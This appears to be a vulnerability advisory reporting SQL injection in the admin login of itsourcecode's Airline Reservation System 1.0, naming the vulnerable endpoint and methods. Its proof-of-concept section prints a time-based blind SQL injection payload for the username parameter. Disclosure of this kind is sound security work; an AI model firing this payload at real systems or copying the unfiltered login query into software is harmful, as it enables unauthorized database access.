# Vendor

itsourcecode

# Product

Airline Reservation System

# version

1.0

Download Source Code: https://itsourcecode.com/wp-content/uploads/2021/03/Airline-Reservation-System-PHP-Project-Source-Code.zip

# Vulnerabilities

SQLi

# Description

On the /admin/login.php page, users enter their username and password for login verification. By capturing the request, it was found that the verification interface is /admin/ajax.php?action=login. By locating the method corresponding to the login action and analyzing it, it was discovered that in the admin/admin_class.php page, the filtering of the username and password fields is insufficient, leading to SQL injection vulnerabilities. The same issue also occurs in the login2() method.
<img width="859" alt="image" src="https://github.com/user-attachments/assets/875f158c-d1d5-48a9-91e2-18e753333426">
<img width="1463" alt="image" src="https://github.com/user-attachments/assets/a55a26b7-5f7a-46e1-b2c8-d0693728887a">

# Poc
```
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=root' AND (SELECT 9673 FROM (SELECT(SLEEP(5)))bZXm) AND 'aMFp'='aMFp&password=Aa12345^
```
